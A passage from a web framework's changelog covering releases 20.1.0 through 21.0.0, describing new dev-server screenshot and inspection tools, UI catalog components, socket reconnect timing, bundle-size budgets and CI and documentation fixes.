  `budgets` step reports a browser-only read (`useQuery`, `useConnection`, `useMutation`,
  `useMutationQueue`, `useRecord`, `useChannel`, and now `hasPageSocket`) in a module of a route's
  server graph that no island imports. Guarding on `hasPageSocket()` used to count as having
  handled the absence. But it answers `false` on the server every time, so the guarded code renders
  its fallback forever, at 200: that is how the reference app's update banner, in a layout no
  island imports, never showed (`packages/cli/src/live-routes.ts`). The edit: move the module into
  an island (`x g island <route-dir> --at <route-dir>`, import it from the island's `mount()`,
  declare `island({ src })`).
- **BREAKING — a browser reconnects within 4 s, not 30 s.** The page socket redials on
  `browserBackoff`: base 500 ms, factor 2, `equal` jitter, capped at `BROWSER_RECONNECT_MAX_MS = 4_000`
  (`packages/realtime/src/thundering-herd.ts`). A 20.x `LiveClient` used the server-side
  `defaultBackoff`, `full` jitter up to 30 s. That was measured after a deploy leaving the returning
  node, and the `update-available` it held for the tab, unreached for 27 s. A server-directed
  `reconnect` frame from a draining node still assigns each socket its slot. The edit is only for a
  deployment sized on the old spread: a SIGKILLed node's herd now redials inside a 2–4 s window, so
  check the sync node's `AcceptBudget` sheds that burst before any query runs.
- **BREAKING — `LaunchedBrowser` is `{ connection, close }`, not `{ endpoint, close }`**
  (`@ultimat3/cli`). A launched Chrome is now driven over `--remote-debugging-pipe`
  (`packages/cli/src/cdp-pipe.ts`), and the connection it returns is already answering. The edit:
  `cdpConnect(browser.endpoint)` → `browser.connection`. `cdpConnect(endpoint)` stays, for a remote
  browser reached by URL.

### Commits

- chore(deps): @types/bun 1.4.1, pglite 0.5.8, solid-js 1.9.15, sass 1.104.0, @babel/core 8.0.1 (#508)
- feat!: one client store, one transport, one socket (plan 101, 21.0.0) (#504)
- fix(http): request services bind to the authenticated actor, not anonymous (#503)
- docs(plans): 101 — the cross-tab socket lives in a SharedWorker (#501)
- docs(plans): 101 — every decision made, 17 tier-ordered slices (#500)
- docs(plans): 101 — one client store, one transport, one socket (21.0.0) (#499)

## 20.2.1 - 2026-09-19

### Changed
- **A one-button island costs solid-js plus a few kB, not 61 kB (#490).** The scaffold's theme-toggle island (`<UiProvider><ThemeToggle mode="toggle" /></UiProvider>`) measured 62,463 B minified under CI's own `file:` links; it measures 33,964 B now (Bun 1.4.0; 36,971 B under 1.4.2, which honours `sideEffects` and keeps `@ultimat3/core`'s declared modules). Three cuts, each a retention fix rather than a new import path: (1) `x build` installs a `solid-js` dedupe plugin first in every island build (`packages/cli/src/island-solid-dedupe.ts`) — `Bun.build` resolves from a module's REAL path, so `@ultimat3/ui` reached through a symlink brought its own copy of solid-js, 12.4 kB of a second runtime (and a second reactive graph) in every chunk built under `file:` overrides or `bun link`; (2) `useUi()`'s server branch reads a slot that `@ultimat3/ui`'s `theme/ambient.ts` fills at import, and `package.json`'s `browser` field maps that module to an inert twin for browser bundlers — so `@ultimat3/i18n` (the framework catalog it installs at import), `@ultimat3/time` and core's logger, 16.1 kB reached only by a branch a DOM never takes, are out; `directionOf`/`isRtl`/`Direction` moved to `@ultimat3/core` (i18n re-exports them, no caller changed) and `fallbackTranslator` is written in ui, pinned member-for-member against `createTranslator({})`; (3) `@ultimat3/ui`'s `registerErrorCodes()` call is its own `error-registry.ts`, so `errors.ts` is pure and a Bun that honours `sideEffects` no longer drags core's error registry (10.9 kB) into an island that only registers a runtime. The scaffold dashboard budget is `60kb` again. `barrel-bytes.test.ts` pins the island's retained-module list — no `i18n`, `time` or `money` path, no `ambient.ts`, nothing of ui outside a named list — and compares the parity pair module by module in path order, so it is green on 1.4.0 and 1.4.2 alike (it was 3 red on 1.4.2). Still in the chunk: `Select` (~1.3 kB, `mode` is a prop) and core's error registry behind the throw sites.

### Fixed
- **`ui.shot`, `ui.inspect`, `ui.interact`: a requested `theme` is stored as the visitor's choice, so a dark-default app captures light.** `theme: 'light'` only emulated `prefers-color-scheme`, and since 20.2.0 the inlined boot script answers `theme.defaultMode` before the OS — so on an app with `defaultMode: 'dark'` every "light" capture came back dark, and `ui.inspect` reported `theme: 'dark'` for a light request (#489). `runShot` now also seeds `localStorage[THEME_STORAGE_KEY]` on the page's origin BEFORE the document's own scripts, through a new page verb `ScrapePage.prepare(expression)` (`@ultimat3/scraping`: `ScrapeTarget.prepare`, the CDP port's optional `evaluateOnNewDocument`, refused by name with `X_NOT_IMPLEMENTED` on a launcher that lacks it; the offline drivers accept it, as they do `colorScheme()`, and the CDP fake records it as `prepared`). The expression is `themeChoiceExpression(scheme)` in `@ultimat3/cli` (`shot-theme.ts`), derived from `@ultimat3/render`'s `THEME_STORAGE_KEY`, never restated. Nothing is seeded when no theme is requested: the capture is then the app's own default, which is the point of `defaultMode`. `ui.island` is unaffected — the island harness renders its own `data-theme` and carries no boot script.

### Commits

- perf(ui): a one-button island costs solid-js plus a few kb, not 61 kb (#496)
- fix(shot): a requested theme is stored as the visitor's choice, so a dark-default app captures light (#495)

## 20.2.0 - 2026-09-19

### Added
- **`x new` scaffolds a designed app, dark by default.** The generated app opens with `theme: { defaultMode: 'dark' }` and ships a shell (`apps/web/shared/shell.tsx` over the catalog's `AppShell`: brand mark, sidebar with `aria-current`, environment pill, page actions, footer), a landing hero (dot-grid ground, eyebrow, balanced headline, lede, two calls to action, three feature cards — still `0kb`), the one island the scaffold has (`theme-toggle.island.tsx`, the catalog's `ThemeToggle` with the boot's verdict as its starting point), and `apps/web/site/errors/404.html` / `500.html` (self-contained, `noindex`, the same two hex values as `pwa.colors`). The dashboard is honest per invocation: `--example` aggregates the seeded posts through a pure `dashboard-view.ts` (`postStats`, `bucketByDay`) into a `StatTile` row, a `BarChart` and a `DataTable`; `--no-example` shows framework facts (routes, locales, roles, version) and the route table, and draws no chart because nothing honest exists to chart. Templates split into `scaffold-site.ts`, `scaffold-shell.ts`, `scaffold-dashboard*.ts`, `scaffold-errors.ts`; file counts 161 / 133; the dashboard budget is `64kb` (the toggle island measures 60.9kb minified, solid-js being 12.6kb of it).
- **`ui.interact` on the dev MCP server (17 tools).** Drive a budgeted route through at most
  12 steps — `{click}`, `{type: {selector, text}}` (≤500 chars), `{press}` (a key chord),
  `{focus}`, `{wait: ms ≤ 5000 | selector}` — then photograph it (`fullPage` defaults to FALSE:
  a dialog is judged on the fold) and, with an `inspect` block, read the same facts `ui.inspect`
  reads, in ONE navigation. After every step the islands settle again (`runShot`'s `act` seam)
  and one `SETTLE_POLL_MS` passes for the CSS transition; per step `{ index, kind, ms,
  navigated, url }`. Four refusals, each whole and never a trim: `X_UI_INTERACT_STEPS_INVALID`
  (bounds, a step with zero or two keys), `X_UI_INTERACT_SECRET_FIELD` (`<input
  type="password">`, before any keystroke), `X_UI_INTERACT_LEFT_APP` (a step left the dev
  server's origin; same-origin navigation is allowed and reported), `X_UI_INTERACT_STEP_FAILED`
  (a scraping error, wrapped with `meta.step` and `meta.code`). PNG and verdict under
  `.x/shot/<slug>/<WxH-scheme>/interact-<hash8 of the steps>/`, deterministic per step list and
  never over `ui.shot`'s. `ok` is the verdict's, except that a navigation a step caused is not
  the redirect the verdict fails a capture for. `ui.inspect`'s read (`readInspect`) and the
  handler's selector/style bounding (`inspectSpecOf`) are shared, not duplicated. Part of #463
  (step 4).
- **`QrCode` in the catalog, with a pure-TS encoder.** One short value — a link's short URL, a join code — as static SVG: a ground `<rect>` plus one `<rect>` per dark module, `role="img"` with a translated `label`, a `quietZone` prop (default 4). No QR library: `qr-encode.ts` / `qr-matrix.ts` implement byte mode at error-correction level M for versions 1–3 only (21×21 to 29×29, a 42-byte ceiling) — the versions with at most one alignment pattern, no version block and one Reed-Solomon block, which is what keeps the encoder two pages instead of a dependency. Past the ceiling is the new `X_UI_QR_CAPACITY`, refused rather than truncated. `encodeQr` and `QrMatrix` are exported. The stylesheet is the one component allowed a theme selector: a QR must stay dark-on-light in both themes because scanners refuse the inverse, so the ground and module roles swap under both the media path and `data-theme='dark'`.
- **`CommandPalette` in the catalog.** The ⌘K palette: a filter field over commands and destinations in a NON-modal `<dialog>` driven by its `open` attribute (never `showModal()`, so a harness with no dialog methods and a server with no DOM render it alike), a viewport-sized `box-shadow` as the scrim, roving tabindex over native buttons, and every string a prop. Controlled: the open flag, query and active item live in the caller, and the rules live in pure `command-palette-view.ts` — `filterItems`, `stepActive`, `settleActive`, `keyAction` — so a caller wires four lines instead of rewriting them.
- **`BarChart` and `Sparkline` in the catalog.** One series as static SVG — `<rect>` bars with a quarter grid, a `<title>` per bar and `data-bar` hooks; a single `M`/`L` path with a dot on the last point — so the server-rendered shell IS the chart and nothing waits for hydration. No charting library, deliberately: the wiki's own cautionary example is a sparkline pulling one into the pricing page. Geometry in pure `bar-chart-view.ts` / `sparkline-view.ts` (`ChartPoint { key, value }`, `barRects`, `sparklinePath`).
- **Four catalog components: `StatTile`, `Meter`, `Kbd`, `CopyButton`.** The pieces a dashboard's top row and a data table's cells are made of, lifted from an app that had to hand-roll every one of them. `StatTile` (label, pre-formatted value, `data-stat` hook, trend chip from the pure `deltaOf(current, baseline)`, hint), `Meter` (an SVG bar with a `width` attribute — identical on the server and after hydration, nothing for `style-src-attr`; decorative by default, a `meter` role with a label), `Kbd` (a native `<kbd>`), `CopyButton` (a real button server-side; the clipboard write and the 1.6 s check mark are additive client behaviour; strings from the new `ui.copy` / `ui.copied` keys). Intrinsic tags only, because a runtime-chosen root is called as a component by the island build.
- **`@ultimat3/scraping`: `press`, `focus` and `accessibility` on the page vocabulary.**
- **`ui.diff` on the dev MCP server (18 tools).** Compare two PNGs the other `ui.*` tools wrote
  without a browser and without a dependency: `before`/`after` are paths relative to the app root
  and must resolve — lexically and through any symlink — inside `.x/shot/`
  (`X_UI_DIFF_PATH_OUTSIDE`), which is what lets a file-reading tool sit under `dev:read` as
  `destructive: false`. Answers `changedPixels`, `changedPercent` (two decimals), `changedBox`
  (the bounding box of every changed pixel, or `null`) and the path of a diff PNG written beside
  `after` as `diff-<hash8 of before>.png` (or `out`, gated the same way): the `after` capture
  faded to a quarter over grey, changed pixels solid red. A pixel is changed when any channel
  moved by more than `threshold × 255` (default `0.1`); no anti-alias detection, deliberately.
  Decodes through core's raw-pixel seam, and a PNG in another shape (Chrome's RGB for an opaque
  page) takes one pass through `transformImageBytes` first. Two sizes are
  `X_UI_DIFF_SIZE_MISMATCH` naming both; a missing file `X_UI_DIFF_FILE_MISSING`. Pure
  `ui-diff.ts` (`diffPixels`, `changedPercent`) and `mcp-ui-diff.ts` (the gate, the decode, the
  write). `uiTools` now takes `{ test, read }` scopes. Closes the last step of #463.
- **`ui.inspect` on the dev MCP server (16 tools).** DOM, computed-style and accessibility facts
  for up to 20 selectors in ONE navigation of a budgeted route — per match the tag, text
  (≤200 chars), bounding box, visibility, attributes (≤20), the computed `styles` named (≤32,
  `^[a-z][a-z0-9-]*$`; the rest are answered in `droppedStyles`) and, with `a11y: true`, the
  browser-computed role and name (`page.accessibility`, merged by index); per document the title,
  `data-theme`, the focused element, the island count, console errors, page errors and refused
  requests. Bounds: 25 matches per selector applied in the page, a 64 KB wire cap that drops
  `matches` from the last selectors first, `truncated: true` on either; an unparsable selector is
  `valid: false`, never a crash. Takes the same PNG and verdict as `ui.shot`, under
  `.x/shot/<slug>/<WxH-scheme>/inspect/`, and `ok` is that verdict's. `runShot` grew an `act`
  hook (after the islands settled, before the picture); the three `ui.*` tool literals and their
  types moved from `dev-server.ts` (439 lines) to `dev-ui-tools.ts`, re-exported. The two
  `X_UI_SHOT_ROUTE_*` titles now name "a `ui.*` tool". Part of #463.
- **The framework inlines the no-flash theme script, with `theme.defaultMode` as its fallback.** `x dev`, the container and the static export write `themeScript({ fallback })` into every document's `<head>` before the stylesheet and admit its hash to `script-src` from the same string (`packages/cli/src/theme-boot.ts`). `theme.defaultMode` in `app.config.ts` had no reader before; `theme: { defaultMode: 'dark' }` is now all an app needs to open dark. The script is counted and never charged by `budgets` (`FRAMEWORK_INLINE_SCRIPTS`), for `x-sw-register.js`'s reason: an author cannot edit, delete or move it. `themeScript()` gains `fallback`, exports `themeScriptBody()`, and its storage key is `ultimate.theme` — the key `ThemeToggle` already wrote (`THEME_STORAGE_KEY`, pinned equal across render and ui by a test). `@ultimat3/ui`'s `THEME_INLINE_SCRIPT` and its helpers are deprecated, removed in 21.
- **An app's own error pages are admitted to `style-src`.** `apps/web/site/errors/<status>.html` is served verbatim and carries its own `<style>`; the enforced policy a container sends blocked that block (invisible in `x dev`, which is report-only). Every `<style>` body in those files is hashed at boot (`packages/cli/src/error-page-csp.ts`).
- **Three authoring mixins in `@ultimat3/ui/tokens`:** `data-text` (mono family, tabular figures — for slugs, counts, timestamps, ids), `label-caps` (the section-label voice) and `dot-grid` (the faded dot-grid ground for a hero or a dashboard main). Every value is a token.

### Fixed
- **`<dialog>` opened pinned to the top-left corner.** The reset's `* { margin: 0 }` outranks the UA stylesheet's `dialog { margin: auto }`, the only rule that centres a modal dialog; every app restated the margin itself. `reset.scss` restates it once.

### Commits

- feat(mcp): ui.diff compares two captures without a browser or a dependency (#486)
- feat(scaffold): x new emits a premium default shell, dashboard, hero and error pages, dark by default (#485)
- feat(mcp): ui.interact drives a route through bounded steps, then captures and inspects it (#484)
- feat(ui): QrCode joins the catalog with a pure-TS encoder (#483)
- feat(ui): CommandPalette joins the catalog (#480)
- feat(mcp): ui.inspect reads DOM, computed styles and a11y facts in one navigation (#481)
- feat(ui): BarChart and Sparkline join the catalog (#478)
- feat(ui): StatTile, Meter, Kbd and CopyButton join the catalog (#479)
- feat(scraping): press, focus and accessibility on the page port (#476)
- feat(theme): boot inlines the theme script from theme.defaultMode; dialog centring; data-text/label-caps/dot-grid mixins (#475)

## 20.1.6 - 2026-09-18

### Fixed

- **`x mcp serve` declares its environment before it loads the app.** The dev MCP server called
  `loadApp` at creation, before any scratch boot had declared `ULTIMATE_ENV` — and a scaffolded
  app's dev actor installs itself at import time, so it installed nothing. On 20.1.5 the first
  `ui.shot` of a session photographed a **401** (`actorKind: anonymous`); the second rendered, only
  because its scratch boot re-imported the app after declaring. Same rule as `x dev` and
  `startDev` now: declare first, import second. Verified: the same three-call session answers
  1/1 islands mounted and zero console errors on every call.

### Commits

- fix(cli): x mcp serve declares its environment before it loads the app (#472)

## 20.1.5 - 2026-09-18

### Fixed

- **A scratch boot (`x shot`, `ui.shot`) is a faithful `x dev`.** Two ways it was not, both found
  by photographing a 20.1.4 app: (1) `declareDevEnvironment` ran in the `x dev` COMMAND only, so a
  scratch server booted with no `ULTIMATE_ENV` and a scaffolded app's fail-closed dev actor
  installed nothing — the picture was of a **401**. It now runs inside `startDev`, every boot.
  (2) With `--port 0` the sync role went to the kernel too, while the wiki and every scaffolded
  `sync-url.ts` say `PORT + 1` — every picture of a live island carried `WebSocket …
  ERR_CONNECTION_REFUSED`. `listen()` now binds one above the port the web role actually bound
  (`syncPortFor(0)` itself is unchanged: the pure function cannot know the bound port). (#466)
- **`ui.shot` / `ui.island` work more than once per `x mcp serve` process.** Each call booted a
  scratch server through `devServerFor` and stopped it after the picture, as the one-shot `x shot`
  command does — but the dev MCP server is one process serving many calls, and a lifecycle drains
  exactly once: the second call in a session answered `X_LIFECYCLE_DRAINED`, the third
  `X_READINESS_CHECK_DUPLICATE`. The scratch server (or the running `x dev` the lock names) is now
  booted at most once per host, `runShot` is handed a handle whose `stop` is a no-op, and the
  host's `close()` stops it. `x shot` the command is unchanged. (#467)

### Commits

- fix(mcp): boot the scratch server once per host, stop it on close (#469)
- fix(cli): a scratch boot declares its environment and binds sync at the bound web port + 1 (#468)

## 20.1.4 - 2026-09-18

### Added

- **The dev MCP server can see the UI: `ui.shot` and `ui.island`.** Thirteen tools could
  introspect routes, schema, policies, jobs and the queue, run the tests and the gate, and read
  the logs — and none could look at a screen. Every visual defect found building an app on 20.1.x
  (two `app/` routes rendering with no shell and no dark theme, a dialog pinned to the top-left
  corner since the day it shipped, an inverted QR code) passed a green gate and was invisible
  until a picture existed. `ui.shot` photographs one route at a named viewport (`phone` 390×844,
  `tablet` 820×1180, `desktop` 1440×900, or an explicit `width`+`height`) in `light` or `dark`
  — the scheme is emulated on the page BEFORE navigation, so a capture never depends on the box
  that took it — against the running `x dev` (reused through its lock, otherwise a scratch
  server), and answers the PNG's **path** plus the verdict `x shot` already writes: console, page
  errors, refused requests, whether every island mounted. Never inlined bytes. It refuses a route
  with no `budget.js` (`X_UI_SHOT_ROUTE_UNBUDGETED`) — the gate refuses the same route as
  `X_BUDGET_UNMEASURED`, and a picture of a draft judges the wrong thing — and an unknown path
  (`X_UI_SHOT_ROUTE_UNKNOWN`). `ui.island` is `x shot --island <name> [--state]` as a tool. Both
  are `destructive: true` under `dev:test`: they launch a browser. Pure exposure of what
  `x shot` does; `ui.inspect` / `ui.interact` / `ui.diff` are the proposal's next steps (#463).
  `runShot` gains an optional `colorScheme`; `x shot`'s own behaviour is unchanged.

### Fixed

- **The scaffolded `unzoned-date` guard's fix names the number exit.** Its regex matches the bare
  `.toLocaleString(` — which is also `Number.prototype.toLocaleString`, and a regex cannot tell a
  count from a date. The match stands (a date formatted that way is the defect), but the printed
  `fix:` told an author formatting a NUMBER to pass `{ timeZone }`, which a number ignores. For the
  bare form it now names both exits: a Date → `{ timeZone }`; a number → `new
  Intl.NumberFormat(locale).format(n)`. The dated forms keep the zone-only fix. An existing app
  updates its `guards/unzoned-date.ts` by hand (`x new` writes it once). (#456)

### Commits

- feat(mcp): ui.shot and ui.island — the dev server can see the UI (#464)
- docs(wiki): record the unreproduced stale-typecheck sighting as a known gap (#450) (#462)
- fix(cli): the unzoned-date guard's fix names the number exit for a bare toLocaleString (#461)

## 20.1.3 - 2026-09-18

### Fixed

- **`x g job`/`x g task` no longer assume a feature has a tenant.** Both templates hard-coded
  `input: t.object({ id, orgId })`, `tenant: (input) => input.orgId` and calls to
  `repo.byId`/`repo.listByOrg`, on the assumption that `x g entity` always scaffolds
  `tenant: 'orgId'`. A feature's entity need not be tenant-scoped — `x g task purgeOrphans
  --feature links` into a feature with no `orgId` column and no `byId`/`listByOrg` in `repo.ts`
  produced a job that did not compile. The generator now reads the feature's own `entity.ts`/
  `repo.ts` off disk (the same pattern `sliceErrors` already uses for `x g action`) and emits a
  `tenant: 'none'`-shaped job with a neutral body — no `../entity`, no `../repo`, no `orgId` — when
  the entity declares no real tenant column or the repo lacks the pair the tenant-scoped body
  calls. The tenant-scoped output is unchanged. Also fixed `sliceExports` (used to make that
  decision): it never recognised `export async function <name>`, so it always read a real
  `byId`/`listByOrg` as absent. (#447)
- **`x dev` now declares `ULTIMATE_ENV=development` for the app it boots** when neither
  `ULTIMATE_ENV` nor `NODE_ENV` is already set. `tryResolveEnvironment` answers `development` only
  by DEFAULT in that case — indistinguishable from a process that never named its environment at
  all — which is why a scaffolded app's `apps/web/app/auth/dev-actor.ts` had to fail OPEN. That
  template now fails CLOSED (`fallback: 'production'`), and this is what keeps a bare `x dev`
  installing its dev viewer regardless.
- **`x shot --island` no longer fails every state of a live island.** A component whose `mount()`
  unconditionally dials `@ultimat3/realtime`'s `LiveClient.connect()` (or any `WebSocket` /
  `EventSource`) used to fail `X_SHOT_ISLAND_UNSTUBBED_REQUEST` in every state, and the error's own
  `fix:` named a stub `match` the harness's grammar could never accept (`WS ws://…` fails
  `isStubMatch`). The harness now gives `WebSocket`/`EventSource` an inert stand-in — it constructs,
  never opens, `close()`/`send()` are no-ops — recorded on its own `sockets` list rather than on
  `unstubbed`; a real unanswered `fetch`/XHR still fails the run unchanged. (#448)
- **`x shot` launches Chrome with the same container flags the e2e driver already needed.**
  `cdp-launch.ts`'s launcher (`x verify`'s e2e step) passed `--no-sandbox` and
  `--disable-dev-shm-usage`; `x shot`'s launcher — a different process, `puppeteer-core`'s own
  `launch()` — passed neither, so on Ubuntu 23.10+ (AppArmor restricts the unprivileged user
  namespace the sandbox needs) Chrome exited "No usable sandbox" and `x shot` could not run on a
  box where the e2e gate ran green. Both launchers now read the same exported
  `CONTAINER_CHROME_ARGS`. An attach (`--cdp-url`) is unaffected — it starts nothing locally. (#444)
- **`x verify`/`x test` no longer leak `.env.development` into the `bun test` children they
  spawn.** Bun auto-loads `.env.development`/`.env.development.local` into the parent `x` process
  whenever `NODE_ENV` is unset; `exec.ts` then spread that whole environment onto every `bun test`
  child regardless, even though the child itself runs with `NODE_ENV=test` and would never load
  those files on its own. A key is now dropped from a spawned test process when the parent's
  current value for it matches exactly what `.env.development`/`.env.development.local` would have
  set (`test-dotenv.ts`'s `testEnvOverrides`, wired into `test-shards.ts`, `verify-tests.ts`,
  `verify-test-run.ts` and `mcp-host.ts`'s `runTests`). `x dev` is unaffected.
- **`:global()` in a CSS module is unwrapped instead of shipped.** `scopeClasses`
  (`packages/render/src/css-modules.ts`) rewrote `.class` selectors and knew nothing of
  `:global(...)`, so it reached the browser as written — an unknown pseudo-class, which drops the
  WHOLE rule. `@ultimat3/ui` has twelve such rules: `Table.module.scss`'s cell padding, row
  borders, header ground, density and striping, and `ErrorState`'s `<dt>`/`<dd>` styling. Every app's
  catalog table therefore rendered flush, centred and unruled, under a green gate — nothing but a
  browser ever parsed the CSS. The wrapper now closes on its OWN parenthesis
  (`:global(tr:nth-child(even) td)`), a class inside it keeps its unscoped name, and an unclosed
  wrapper is left as written rather than swallowing the sheet.

### Commits

- fix(render): unwrap :global() in a CSS module instead of shipping it (#455)
- fix(cli): x verify/x test no longer leak .env.development into bun test children (#458)
- fix(cli): x shot launches Chrome with the same container flags e2e needs (#451)
- fix(cli): x shot --island gives a live socket an inert stand-in (#449)
- fix(cli): x dev declares ULTIMATE_ENV=development so a fail-closed dev-actor still boots (#459)
- fix(cli): x g job / x g task no longer assume a feature has a tenant (#457)

## 20.1.2 - 2026-09-16

### Changed

- **A scaffolded app's CI gates each commit once.** A branch with an open pull request
  fired `push` and `pull_request` for the same tree and gated it twice; the `pull_request` run is now
  skipped for a branch in the app's own repository and still runs for a fork, which fires no push. A
  newer push cancels the run in flight for its branch, except on the default branch, whose group is
  keyed by SHA so every commit keeps its verdict. Bun's download cache is restored before
  `bin/setup`, keyed on `bun.lock`. An existing app adopts it by copying the `concurrency:` block,
  the job's `if:` and the `actions/cache` step from a fresh `x new` — the file is the app's own.

### Fixed

- **A package whose tests fail in isolation no longer passes the per-package coverage gate.**
  `scripts/coverage-gate.ts` never read `bun test`'s exit code: a failing suite still wrote an lcov
  report, cleared its bar, and reported green — measured with a probe `expect(1).toBe(2)` in
  `packages/money`. It is now `X_TEST_FAILED`, naming the failing tests. `--all` runs the package
  suites concurrently, one process each, on every core (`--jobs <n>` to bound it).
- **Three framework suites passed only in a lucky file order**, found the moment the coverage gate
  read the exit code on a runner: `@ultimat3/ai`'s `openai-models.test.ts` inherited a model
  another file registered, `@ultimat3/testing`'s `fixture-network.test.ts` handed later files an
  UNSEALED network, and `@ultimat3/cli`'s `cmd-dev.test.ts` left core's lifecycle drained, so every
  later request answered 503 `X_DRAINING`. Each file now restores the state it found.
- **Framework CI: the 32-job per-package matrix is one `packages` job.** GitHub bills each job
  rounded up to a whole minute, so the matrix was 33 of the ~40 runner-minutes one push cost.

### Commits

- ci: one packages job instead of a 32-job matrix; coverage gate reads the test exit code (#437)

## 20.1.1 - 2026-09-12

### Fixed

- **A gate step whose suite executed nothing reports as skipped, never as passed** (#434). `x verify`
  printed `✓ e2e 46ms` and `"skipped": false` over the one `e2eTest` a scaffold writes, which
  `test.skip`s itself until the app registers a browser driver — so a customer's green gate included
  a lane that had never run, and nothing in the table or in `--json` said so. `bun test` exits 0 over
  an all-skipped file, but it prints its own counts and `packages/cli/src/test-counts.ts` was already
  reading them: the rule is now `tests.ran === 0` in `packages/cli/src/verify-run.ts`, read once and
  answered two ways — a step the committed `x.verify.json` requires stays the `X_VERIFY_SUITE_VANISHED`
  failure it already was, and a step no floor requires is a skip beside `roadmap`'s, counted apart
  from the passes in the summary line. A missing browser driver is a skip rather than an error code
  because the framework ships no browser by design (`packages/scraping/src/cdp-port.ts`: the app
  installs `puppeteer-core`, the CLI asks for it) — unlike Bun's own floor, which is `X_BUN_VERSION`
  and a refusal. `StepResult.tests` now reaches `--json` and the human line, so `- e2e  found 1
  test(s) and every one skipped itself` is distinguishable from `- roadmap`, which has no suite at
  all.

### Commits

- fix(cli): a gate step whose suite executed nothing is skipped, not passed (#435)

## 20.1.0 - 2026-09-12

### Added

- **[Bare VM](https://github.com/developerz-ai/ultimate/wiki/Bare-VM)** (`wiki/Bare-VM.md`): the
  four commands a fresh Ubuntu box with bun and git runs — `bunx create-ultimate demo --no-git`,
  `cd demo`, `bin/setup`, `bin/check` — and why no Docker daemon and no provisioned service is
  needed. An empty `DATABASE_URL` is not a hole to fill: it is the switch `resolveServices`
  (`packages/cli/src/dev-services.ts`) reads to select the embedded database
  (`packages/db/src/pglite.ts`), which is Postgres compiled to WASM in this process, an optional
  peer resolved at first query. The page states what that database does **not** do —
  no walsender, so no logical replication and no slot — and that its absence is `X_DB_UNAVAILABLE`
  with a runnable `fix:`, never a silent skip. The wall-time table carries a first measurement from
  a WSL2 developer box on a warm cache — `bin/setup` 6,802ms and `bin/check` 5,389ms on the default
  scaffold, 5,135ms and 3,909ms with `--no-example`, 12.0s for a cold install, and the **first**
  `bin/check` green at 20 of 20 steps on both shapes with `budgets` among them — plus a marked
  placeholder for the `ubuntu-latest` half, which the CI job that runs the scaffold's own
  `bin/setup && bin/check` prints on every run.

- **A generated app ships `.github/workflows/ci.yml`** — `bin/setup` then `bin/check`, on push and
  pull request: the same two commands its own `README.md` opens with, run by a machine that has
  never seen the repository. Documented in `wiki/Installation.md`, `wiki/CLI-Reference.md` and
  `docs/architecture/12-generated-app.md`.
- **`x doctor` reports embedded-Postgres readiness.** The external-database probe answers nothing
  where `DATABASE_URL` is unset, and that silence is exactly a bare VM, so the diagnostic was
  blind to the only database a fresh box has and `bin/setup` found out at `x db migrate` instead.
  It now asks whether `@electric-sql/pglite` **resolves** from the app root — a resolve, never an
  import, since loading it boots the WASM build and takes the single-writer lock the next command
  needs — and reports `X_DB_UNAVAILABLE` only where `DATABASE_URL` is unset **and** the peer is
  unresolvable, reusing `@ultimat3/db`'s own sentence and fix rather than a CLI twin of them.

### Changed

- **The docs describing the scaffold's CI waiver are rewritten, because the waiver is gone.**
  `scaffold-smoke` now runs a fresh app's own `bin/setup && bin/check` once, with **no
  `--allow-red budgets` and no fix-follow**, and `budgets` is asserted green rather than merely
  not-red — a skipped step would mean the static build ahead of the gate bought nothing.
  `wiki/Tutorial-01-First-App.md`, `docs/idea/21-the-range.md`, `docs/idea/14-roadmap.md`
  (milestone 10 is an unmodified green gate now), `docs/idea/README.md`, `README.md` and
  `wiki/Error-Codes.md`'s `X_SCAFFOLD_GATE_RED` row all said otherwise. **Four rows in
  `wiki/Error-Codes.md` documented codes nothing raises any more** — `X_SCAFFOLD_FIX_LOOP`,
  `X_SCAFFOLD_FIX_UNFOLLOWED`, `X_SCAFFOLD_BUILD_FAILED`, `X_SCAFFOLD_BUILD_REGRESSED`, all four
  belonging to the deleted fix-follow loop — and are deleted with it, from the table and from the
  never-ships list.
- **A fresh scaffold lints clean on the first run**, zero diagnostics across every source file it
  writes. `docs/idea/14-roadmap.md` still said the first run "can be red on `lint`" and that it
  "depends on the app's name"; that was closed when `sortedImports` landed.
  `wiki/Known-Gaps.md`'s open line-width item is about `x g` output, and now says so.
- **The generated brain names `bin/check` as the gate**, not `x verify`: the app's `AGENTS.md`,
  `CLAUDE.md` and `README.md` now say the gate is a static build and then the gate proper, and that
  the platform's `.dz/` is additive in both directions.
- **The generated app's `engines.bun` is interpolated from the shipped CLI's own floor** instead of
  being typed a second time. The two had drifted a whole minor apart, so `bun install` accepted a
  runtime the very next line of `bin/setup` refused with `X_BUN_VERSION`;
  `scripts/bun-pin.test.ts` now reads the emitted string as a pin site, which nothing did before —
  `enginesFloors` globs manifests that exist on disk and this one is a template literal until the
  generator runs.

### Fixed

- **The framework's own service-worker registration is no longer billed to the app's `js` budget.**
  `/x-sw-register.js` is written by the framework and the author cannot edit, delete or move it, so
  its bytes ate a budget nobody set and made every route on a fresh scaffold report it as the
  `heaviestChain`. `measureDocumentJs` (`packages/cli/src/budgets.ts`) now counts it into
  `frameworkBytes` and keeps it out of both `jsBytes` and `entries`, so `checkBudgets` compares the
  declared `js` budget against the app's bytes alone and the framework's are reported per route as
  `frameworkJsBytes` — counted, never charged. **And the number no longer depends on build order**:
  `prerender` (`packages/cli/src/prerender.ts`) writes the registration BEFORE both measurements
  instead of beside `sw.js` at the end, so it is a property of this build rather than of whatever
  the output directory already held — 0 on a clean `out`, the previous build's copy on a reused
  one. That is the run-order dependence the `jsBytes` split closed, which came straight back when
  the field changed and the ORDER did not. `frameworkJsBytes` is optional on `RouteStats` because a
  stats file written before this release carries no such key, and absent is not zero.

- **Every page stating `bin/setup`'s command list was two steps short.** The scaffold's script runs
  six — `bun install`, an `.env.development.local` touch, `x db gen "initial"` when
  `packages/db/migrations` holds no `.sql`, `x db migrate`, `x db seed`, `x manifest` — and nine
  pages wrote the four-step form: `README.md`, `wiki/Home.md`, `wiki/Installation.md`,
  `wiki/Getting-Started.md`, `wiki/FAQ.md`, `wiki/Tutorial-01-First-App.md`,
  `docs/idea/00-thesis.md`, `docs/idea/13-dx.md`, `docs/idea/21-the-range.md`. `x manifest` is the
  step that mattered: `x.manifest.json` is a projection of the loaded app, `x new` cannot write it,
  nothing else runs the command, and `x verify`'s `manifest` step refuses its absence with
  `X_MANIFEST_MISSING`.
- **`bin/check` is a build and then a gate, and the docs called it the gate alone.**
  `x build --target static` runs first because `budgets` compares declared limits against measured
  bytes in `.x/build-stats.json` and that build is the file's only writer — so the build is what
  makes the step measurable, and `--json` is forwarded to both commands.
